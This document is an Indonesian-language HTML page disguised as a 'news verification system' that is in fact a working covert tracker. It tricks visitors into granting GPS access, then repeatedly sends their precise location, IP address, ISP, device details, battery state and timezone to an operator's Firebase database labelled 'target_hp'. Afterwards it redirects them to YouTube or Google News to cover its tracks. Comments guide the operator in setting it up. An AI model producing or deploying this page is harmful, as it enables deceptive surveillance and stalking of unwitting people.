<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Berita</title>
    <style>
        /* Tampilan Splash Screen / Loading */
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .container { text-align: center; padding: 20px; transition: opacity 0.5s; }
        .loader { border: 4px solid #1e293b; border-top: 4px solid #3b82f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-weight: 300; letter-spacing: 1px; }
        p { color: #94a3b8; font-size: 14px; }
    </style>
</head>
<body>

<div class="container" id="app">
    <div class="loader"></div>
    <h2>MENYINKRONKAN SISTEM...</h2>
    <p>Mohon izinkan akses GPS untuk memverifikasi lokasi wilayah berita Anda.</p>
</div>

<script>
    // --- KONFIGURASI_FIREBASE ---
    // Ganti URL di bawah dengan URL Realtime Database kamu
    // Contoh: https://proyek-kamu-default-rtdb.firebaseio.com/target_hp.json
    const DB_URL = "ISI_DENGAN_URL_FIREBASE_KAMU/target_hp.json";

    // Daftar link redirect (YouTube atau Berita Viral)
    const REDIRECT_LINKS = [
        "https://www.youtube.com/trending",
        "https://news.google.com/topics/CAAqJggKIiBDQkFTRWdvSUwyMHZNRGx6TVdZd0VnVndkQzhvQUFQAQ?hl=id&gl=ID&ceid=ID%3Aid"
    ];

    let lastSent = 0;

    // 1. Fungsi mendapatkan IP & ISP via layanan publik gratis
    async function getNetworkInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            return await response.json();
        } catch (e) { return {}; }
    }

    // 2. Fungsi mendapatkan status baterai
    async function getBattery() {
        try {
            const battery = await navigator.getBattery();
            return { level: Math.round(battery.level * 100) + "%", charging: battery.charging };
        } catch (e) { return "N/A"; }
    }

    // 3. Fungsi utama pengiriman data ke Firebase (Metode PUT = Overwrite)
    async function sendToFirebase(coords) {
        const net = await getNetworkInfo();
        const bat = await getBattery();

        const payload = {
            lat: coords.latitude,
            lon: coords.longitude,
            ip: net.ip || "N/A",
            isp: net.org || "N/A",
            device: navigator.userAgent,
            battery: bat,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            updated_at: new Date().toLocaleString("id-ID")
        };

        fetch(DB_URL, {
            method: 'PUT',
            body: JSON.stringify(payload)
        });
    }

    // 4. Inisialisasi Pelacakan
    function initTracker() {
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                (pos) => {
                    const now = Date.now();
                    // Kirim data setiap 5 detik (5000ms)
                    if (now - lastSent > 5000) {
                        sendToFirebase(pos.coords);
                        lastSent = now;
                        
                        // Setelah pengiriman pertama berhasil, arahkan target
                        setTimeout(() => {
                            const randomLink = REDIRECT_LINKS[Math.floor(Math.random() * REDIRECT_LINKS.length)];
                            window.location.href = randomLink;
                        }, 2000);
                    }
                },
                (err) => {
                    document.getElementById('app').innerHTML = "<h2>ERROR: SINKRONISASI GAGAL</h2><p>Mohon aktifkan GPS dan refresh halaman ini.</p>";
                },
                { enableHighAccuracy: true, maximumAge: 0 }
            );
        }
    }

    // Jalankan tracker saat halaman dibuka
    window.onload = initTracker;
</script>

</body>
</html>
